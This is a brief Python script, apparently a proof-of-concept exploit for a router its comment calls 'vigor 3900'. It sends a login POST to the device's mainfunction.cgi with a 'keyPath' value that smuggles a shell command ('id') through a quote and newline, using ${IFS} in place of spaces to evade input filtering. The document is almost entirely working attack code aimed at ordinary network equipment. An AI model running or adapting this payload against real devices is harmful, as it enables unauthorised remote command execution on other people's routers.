from urllib import request, parse
# vigor 3900
url = "http://xxxxxx/cgi-bin/mainfunction.cgi"

payload = {
    'action': 'login',
    'keyPath': "'\nid\n#".replace(' ', '${IFS}'),  # $IFS for bypass regex +
    'loginUser': 'user',
    'loginPwd': 'pass',
}
data = parse.urlencode(payload).encode()    # urlencode
req =  request.Request(url, data=data)
resp = request.urlopen(req)
print(resp.read())